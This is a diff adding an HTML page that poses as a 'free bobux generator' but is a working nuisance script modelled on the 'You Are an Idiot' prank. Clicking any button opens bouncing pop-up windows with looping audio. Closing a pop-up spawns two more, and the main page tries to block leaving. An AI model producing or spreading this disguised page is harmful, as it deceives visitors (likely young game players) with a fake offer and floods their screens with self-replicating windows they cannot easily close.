@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>free bobux generator</title>
+<style>
+html,body{margin:0;height:100%;overflow:hidden;background:black;font-family:sans-serif}
+#yaaiGif{width:100%;height:100%;object-fit:cover}
+#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);color:white;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999}
+#overlay button{margin:10px;padding:15px 30px;font-size:20px;cursor:pointer}
+</style>
+</head>
+<body>
+<img id="yaaiGif" src="https://media.tenor.com/9MVlipGuNioAAAAM/you-are-an-idiot.gif" alt="Yaai GIF">
+<audio id="bgMusic" src="SONG.mp3" loop></audio>
+<div id="overlay">
+<h1>Are you an idiot?</h1>
+<div>
+<button>Yes</button>
+<button>Yes</button>
+<button>Definitely</button>
+</div>
+</div>
+<script>
+const gifSrc="https://media.tenor.com/9MVlipGuNioAAAAM/you-are-an-idiot.gif"
+const windowSize={width:400,height:350}
+function openMiniWindow(x=100,y=100){
+const w=window.open("","",`width=${windowSize.width},height=${windowSize.height},top=${y},left=${x}`)
+if(!w)return
+w.document.write(`<html><head><title>Yaai</title><style>html,body{margin:0;overflow:hidden;background:black;height:100%}img{width:100%;height:100%;object-fit:cover}</style></head><body><img src="${gifSrc}"><audio id="miniAudio" src="Song.mp3" autoplay loop></audio><script>const miniAudio=document.getElementById("miniAudio");miniAudio.currentTime=30;miniAudio.play();const windowSize={width:${windowSize.width},height:${windowSize.height}};let posX=${x},posY=${y};let velX=Math.random()*6+2;let velY=Math.random()*6+2;if(Math.random()<0.5)velX*=-1;if(Math.random()<0.5)velY*=-1;setInterval(()=>{if(window.closed)return;posX+=velX;posY+=velY;if(posX<=0||posX+windowSize.width>=screen.width)velX*=-1;if(posY<=0||posY+windowSize.height>=screen.height)velY*=-1;window.moveTo(posX,posY)},20);window.addEventListener('beforeunload',()=>{for(let i=0;i<2;i++){const newX=Math.random()*(screen.width-windowSize.width);const newY=Math.random()*(screen.height-windowSize.height);window.opener.openMiniWindow(newX,newY)}})<\/script></body></html>`)
+}
+document.querySelectorAll("#overlay button").forEach(btn=>{btn.addEventListener("click",()=>{document.getElementById("overlay").style.display="none";const mainAudio=document.getElementById("bgMusic");mainAudio.currentTime=30;mainAudio.play();openMiniWindow(100,100);openMiniWindow(500,150);openMiniWindow(200,400)})})
+window.onbeforeunload=function(){return"Are you sure? Closing this page is disabled!"}
+</script>
+</body>
+</html>
